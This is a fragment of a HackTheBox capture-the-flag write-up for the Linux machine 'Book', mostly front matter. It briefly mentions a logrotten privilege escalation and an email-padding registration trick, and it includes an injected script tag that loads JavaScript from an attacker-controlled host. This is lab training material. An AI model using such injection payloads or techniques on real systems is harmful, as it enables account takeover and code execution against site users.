...
author = 's4ch'
description = 'Book HackTheBox writeup'
summary = 'Book  is a HackTheBox machine writeup featuring penetration testing techniques and security assessment.'
slug = 'book'
draft = false
...
os = 'Linux'
points = '20'
release_date = '2020-07-11T00:00:00Z'

[cover]
    image = "/writeups/hackthebox/book/book.png"
    alt = "Book HackTheBox Machine"
    caption = "Book - Medium Linux Machine"
    relative = false
...
- logrotten: logrotate race condition pe
...
The server will look if the email `admin@book.htb      cyfun` already exists,
...
```html
<script src="http://10.10.15.117:8000/cyfun.js"></script>
```
